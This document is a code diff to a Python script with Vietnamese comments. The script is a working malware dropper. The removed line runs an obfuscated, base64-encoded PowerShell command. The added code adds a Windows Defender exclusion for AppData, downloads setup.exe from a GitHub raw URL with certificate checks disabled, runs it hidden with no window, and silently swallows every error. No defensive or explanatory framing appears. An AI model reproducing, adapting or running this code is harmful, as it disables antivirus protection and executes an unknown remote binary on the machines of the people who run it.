@@ -1,2 +1,32 @@
+import subprocess
 import os
-os.system("powershell -w h -enc cwB0AGEAcgB0ACAAUABvAHcAZQByAHMAaABlAGwAbAAgAC0AQQAgACcAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQAZQBuAHYAOgBBAHAAcABEAGEAdABhACcAIAAtAFYAIAByAHUAbgBBAHMADQAKAA0ACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGUAbgB2ADoAQQBwAHAARABhAHQAYQBcAHMAZQB0AHUAcAAuAGUAeABlACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AcwBrAGkAYgBpAGQAaQAzADYAMwA2ADEALwBSAHUAbgAvAG0AYQBpAG4ALwBzAGUAdAB1AHAALgBlAHgAZQANAAoADQAKAHMAdABhAHIAdAAgACQAZQBuAHYAOgBBAHAAcABEAGEAdABhAFwAcwBlAHQAdQBwAC4AZQB4AGUA")
+import urllib.request
+import ssl
+
+# --- CẤU HÌNH ---
+url = "https://raw.githubusercontent.com/skibidi36361/Run/refs/heads/main/setup.exe"
+destination = os.path.join(os.environ['AppData'], "setup.exe")
+
+# 1. Thêm ngoại lệ cho Windows Defender (Chạy ẩn)
+defender_cmd = f"Add-MpPreference -ExclusionPath '{os.environ['AppData']}'"
+try:
+    subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", defender_cmd], 
+                   capture_output=True, shell=False)
+except:
+    pass
+
+# 2. Tải file và xử lý SSL
+try:
+    ssl_context = ssl._create_unverified_context()
+    with urllib.request.urlopen(url, context=ssl_context) as response, open(destination, 'wb') as out_file:
+        out_file.write(response.read())
+except:
+    pass
+
+# 3. Thực thi file .exe ngầm
+if os.path.exists(destination):
+    try:
+        # CREATE_NO_WINDOW đảm bảo không có cửa sổ console nào hiện lên
+        subprocess.Popen([destination], creationflags=subprocess.CREATE_NO_WINDOW)
+    except:
+        pass
